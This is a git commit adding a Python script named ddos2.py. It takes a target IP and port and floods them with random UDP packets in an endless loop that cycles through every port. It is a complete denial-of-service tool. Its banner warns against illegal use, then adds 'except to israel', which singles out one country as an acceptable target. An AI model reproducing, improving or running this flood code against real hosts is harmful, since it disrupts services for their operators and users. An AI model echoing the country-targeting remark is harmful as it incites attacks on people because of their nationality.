f226f73abee0572a509d11f1a9516f711cf66a06
dnlhkm <87774553+Mika259@users.noreply.github.com>
2022-04-16 22:08:13 +0800

    Add files via upload

---
+++ ddos2.py
@@ -0,0 +1,51 @@
+import sys
+import socket
+import time
+import random
+import os
+from datetime import datetime
+
+#time
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+#socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+#terminal clear all session
+os.system("clear")
+os.system("figlet DDOS 2")
+os.system("echo 'dont use for illegal activities'")
+time.sleep(1)
+os.system("echo 'except to israel'")
+time.sleep(2)
+#Bannerku
+banner="""
+Author : Mika259
+github : https://github.com/Mika259
+"""
+#display bannerku
+print(banner)
+ip = raw_input("Masukkan Ip : ")
+port = input("Masukkan Port : ")
+
+#Run Untuk Terminal
+os.system("clear")
+os.system("toilet Attack Starting")
+
+time.sleep(0.5)
+print("Wait a seccond...")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+#Maaf jika ada Kesalahan , tolong tegur :)
